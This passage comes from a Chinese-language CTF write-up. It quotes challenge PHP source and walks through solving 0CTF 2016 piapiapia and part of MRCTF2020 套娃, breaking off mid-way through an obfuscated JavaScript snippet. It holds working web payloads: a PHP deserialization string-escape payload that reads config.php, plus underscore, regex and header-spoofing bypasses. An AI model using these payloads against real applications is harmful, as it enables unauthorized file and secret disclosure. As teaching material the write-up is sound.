class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//profile.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable">$profile</span>=<span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">show_profile</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$profile</span>  == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location: update.php&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//注意这里的反序列化</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//注意这里的file_get_contents函数，可以利用其读取config.php</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//update.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp;&amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]));<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//user对象访问update_profile方法，存在序列化</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p><code>flag</code>在<code>config.php</code>中，要想办法读这个文件。<code>$photo = base64_encode(file_get_contents($profile[&#39;photo&#39;]));</code>使我们可以利用的点，想办法让<code>profile</code>数组中<code>photo</code>键对应的值是<code>config.php</code>就行。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>);<span class="hljs-comment">//注意这里的反序列化</span><br><span class="hljs-variable">$phone</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;phone&#x27;</span>];<br><span class="hljs-variable">$email</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;email&#x27;</span>];<br><span class="hljs-variable">$nickname</span> = <span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br><span class="hljs-variable">$photo</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$profile</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]));<span class="hljs-comment">//注意这里的file_get_contents函数，可以利用其读取config.php</span><br></code></pre></td></tr></table></figure><p>通过<code>$profile</code>返回数组，然后对数组键值对进行读取赋值。那么前面肯定有个序列化的过程，我们跟踪到序列化部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$user</span>-&gt;<span class="hljs-title function_ invoke__">update_profile</span>(<span class="hljs-variable">$username</span>, <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$profile</span>));<span class="hljs-comment">//user对象访问update_profile方法，存在序列化</span><br><span class="hljs-comment">//update_profile:</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params"><span class="hljs-variable">$username</span>, <span class="hljs-variable">$new_profile</span></span>) </span>&#123;<br><span class="hljs-variable">$username</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$username</span>);<br><span class="hljs-variable">$new_profile</span> = <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">filter</span>(<span class="hljs-variable">$new_profile</span>);<br><br><span class="hljs-variable">$where</span> = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, <span class="hljs-variable">$new_profile</span>, <span class="hljs-variable">$where</span>);<br>&#125;<br><span class="hljs-comment">//update</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$table</span>, <span class="hljs-variable">$key</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$where</span></span>) </span>&#123;<br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以抓个包看下我们<code>update</code>的数据是怎么传递的：</p><p><img src="/img/pia2.png" alt="pia2"></p><p>现在思路就清晰了：<code>POST</code>传递我们要更新的数据(<code>phone,email,nickname,photo</code>)并转换成数组形式(注意这里设置了<code>waf</code>)，<code>photo</code>会通过<code>$profile[&#39;photo&#39;] = &#39;upload/&#39; . md5($file[&#39;name&#39;])</code>和<code>move_uploaded_file($file[&#39;tmp_name&#39;], &#39;upload/&#39; . md5($file[&#39;name&#39;]))</code>上传到某个位置，然后利用<code>base64_encode(file_get_contents($profile[&#39;photo&#39;])</code>读取。</p><p>看下设置的<code>waf</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) || <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>) </span>&#123;<br><span class="hljs-variable">$escape</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br><span class="hljs-variable">$escape</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$escape</span>) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$escape</span>, <span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-variable">$string</span>);<br><br><span class="hljs-variable">$safe</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br><span class="hljs-variable">$safe</span> = <span class="hljs-string">&#x27;/&#x27;</span> . <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&#x27;|&#x27;</span>, <span class="hljs-variable">$safe</span>) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$safe</span>, <span class="hljs-string">&#x27;hacker&#x27;</span>, <span class="hljs-variable">$string</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>正则匹配的话我们可以通过构造数组绕过，比如<code>nickname[]=点点点</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&quot;zhengze.php&quot;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;未成功绕过！&#x27;</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span><span class="hljs-string">&#x27;成功绕过！&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><code>/?nickname=[]=;&#125;即可</code></p><p>后面思路就是通过构造特殊的<code>nickname</code>让系统在序列化-反序列化过程中忽略真正的<code>photo</code>，去读<code>config.php</code></p><p>举个栗子(参考<code>https://mayi077.gitee.io/2020/02/01/0CTF-2016-piapiapia/</code>)：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$profile</span> = a:<span class="hljs-number">4</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;phone&quot;</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;12345678901&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;email&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;ss@q.com&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;nickname&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;sea_sand&quot;</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;photo&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;config.php&quot;</span>;&#125;s:<span class="hljs-number">39</span>:<span class="hljs-string">&quot;upload/804f743824c0451b2f60d81b63b6a900&quot;</span>;&#125;<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$profile</span>));<br><br>结果如下：<br><span class="hljs-title function_ invoke__">Array</span><br>(<br>    [phone] =&gt; <span class="hljs-number">12345678901</span><br>    [email] =&gt; ss@q.com<br>    [nickname] =&gt; sea_sand<br>    [photo] =&gt; config.php<br>)<br><span class="hljs-comment">//可以看到反序列化之后，最后面upload这一部分就没了（也可以理解为闭合了）。吞掉了后面那部分。</span><br></code></pre></td></tr></table></figure><p>其实如果不限制是数组的话我们构造<code>&quot;;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>然后通过字符串替换把这段吐出去就行，不过因为要是数组的形式，我们需要构造<code>”;&#125;s:5:“photo”;s:10:“config.php”;&#125;</code>(其实就在分号后多了个<code>&#125;</code>)</p><p>然后利用字符串替换把这34个字符吐出去：<code>where到hacker多了一个字符，我们需要34个where</code>:</p><p><code>payload:nickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code></p><p>经过序列化是这么个东西：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>因为检测到<code>where</code>，将其替换成<code>hacker</code>，变成：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json">$profile = a<span class="hljs-punctuation">:</span><span class="hljs-number">4</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;phone&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">11</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;12345678901&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;email&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ss@q.com&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">8</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;nickname&quot;</span>;a<span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span>i<span class="hljs-punctuation">:</span><span class="hljs-number">0</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">204</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;hackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhackerhacker&quot;</span>;<span class="hljs-punctuation">&#125;</span>s<span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;photo&quot;</span>;s<span class="hljs-punctuation">:</span><span class="hljs-number">10</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;config.php&quot;</span>;<span class="hljs-punctuation">&#125;</span><span class="hljs-string">&quot;;&#125;  s:5:&quot;</span>photo<span class="hljs-string">&quot;;s:39:&quot;</span>upload/<span class="hljs-number">804</span>f743824c0451b2f60d81b63b6a900<span class="hljs-string">&quot;;&#125;</span><br></code></pre></td></tr></table></figure><p>这里我想说说具体怎么来的：<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code>。因为数组的形式我们需要<code>&quot;;&#125;</code>闭合<code>nickname</code>的尾巴。反序列化”吐”出后会在<code>s:10:&quot;config.php&quot;;&#125;</code>再加个<code>&quot;;&#125;</code>去闭合我们构造的数组。</p><p>其实这个<code>&quot;;&#125;</code>有没有都无所谓的，反序列化到第一个<code>&quot;;&#125;</code>已经结束了。</p><p>然后抓包修改：</p><p><img src="/img/pia3.png" alt="pia3"></p><p><img src="/img/pia4.png" alt="pia4"></p><p><img src="/img/pia5.png" alt="pia5"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//源码</span><br>&lt;!--<br><span class="hljs-comment">//1st</span><br><span class="hljs-variable">$query</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>]; <span class="hljs-comment">//获取当前页面 URL 中问号后面的查询字符串部分</span><br><br> <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;_&#x27;</span>) !== <span class="hljs-number">0</span> || <span class="hljs-title function_ invoke__">substr_count</span>(<span class="hljs-variable">$query</span>, <span class="hljs-string">&#x27;%5f&#x27;</span>) != <span class="hljs-number">0</span> )&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Y0u are So cutE!&#x27;</span>); <span class="hljs-comment">//不允许存在下划线或其URL编码</span><br>&#125;<br> <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>] !== <span class="hljs-string">&#x27;23333&#x27;</span> &amp;&amp; <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^23333$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b_u_p_t&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you are going to the next ~&quot;</span>; <span class="hljs-comment">//GET传参b_u_p_t,不若等于23333且必须严格匹配23333才返回true，^表示开始%$表示结束</span><br>&#125;<br>!--&gt;<br></code></pre></td></tr></table></figure><p>条件一和条件二是矛盾的，不过由于<code>PHP</code>这种伟大的语言存在肯定变得不矛盾了。网上搜了下<code>substr_count</code>绕过结果直接把<code>wp</code>搜出来了。。后面想了想这个下划线的问题，之前<code>newstarctf</code>做过一道类似的，可以通过一些非法字符去替换这个下划线<code>(https://www.freebuf.com/articles/web/213359.html)</code></p><p>绕过这个<code>_</code>主要有三种方法：</p><p>1.利用空格。</p><p>2.利用小数点。</p><p>3.利用<code>[</code>（注意这个只能利用一次，当PHP版本小于8时，中括号会被转换成下划线<code>_</code>，但是会出现转换错误导致接下来如果该参数名中还有<code>非法字符</code>并不会继续转换成下划线<code>_</code>）</p><p><code>/?b u p t </code>或<code>/?b.u.p.t</code></p><p>接下来就是正则匹配的绕过，<code>0xGame</code>做过类似的，<code>preg_match</code>这东西只会匹配第一行，所以可以用<code>%0a</code>绕过。(<code>参考：https://www.cnblogs.com/iwantflag/p/15262445.html</code>)</p><p>综上我们可以令<code>/?b u p t=23333%0a</code>：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">how smart you <span class="hljs-keyword">are</span> ~<br><br>FLAG <span class="hljs-keyword">is</span> in secrettw.php<br></code></pre></td></tr></table></figure><p>访问<code>secrettw.php</code>:</p><p><img src="/img/taowa1.png" alt="taowa1"></p><p>提示只有本地才能访问，抓包加个头<code>X-Forwarded-For:127.0.0.1</code>，不过没成功？后面又尝试<code>X-Real-IP/Client-IP</code>都没成功。。右键看源码发现这么个东西：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs inform7">&lt;!--<br><span class="hljs-comment">[]</span><span class="hljs-comment">[(!<span class="hljs-comment">[]</span>+<span class="hljs-comment">[]</span>)<span class="hljs-comment">[+<span class="hljs-comment">[]</span>]</span>+(<span class="hljs-comment">[!<span class="hljs-comment">[]</span>]</span>+<span class="hljs-comment">[]</span><span class="hljs-comment">[<span class="hljs-comment">[]</span>]</span>)<span class="hljs-comment">[+!+<span 